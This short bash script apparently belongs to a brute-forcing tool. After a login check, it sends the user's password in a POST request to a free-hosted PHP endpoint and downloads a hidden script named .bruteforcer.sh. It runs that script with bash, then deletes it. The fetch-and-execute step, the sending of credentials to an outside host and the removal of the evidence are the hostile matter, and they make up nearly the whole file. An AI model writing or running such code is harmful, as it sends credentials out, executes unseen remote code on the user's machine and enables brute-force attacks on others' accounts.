source $dir/.authenticate.sh

if [[ $login == "true" ]]; then
    curl -o $dir/.bruteforcer.sh -d "pass=$pass" -X POST "https://sample2276.000webhostapp.com/commandchecker.php?user=$user&command=bruteforce" -s
    bash $dir/.bruteforcer.sh
    rm $dir/.bruteforcer.sh
elif [[ $login == "failed" ]];  then
    echo "error while loging in with username = '$user' and password = '$pass'"
else
    echo "Username = '$user' or Password = '$pass' is/are incorrect"
fi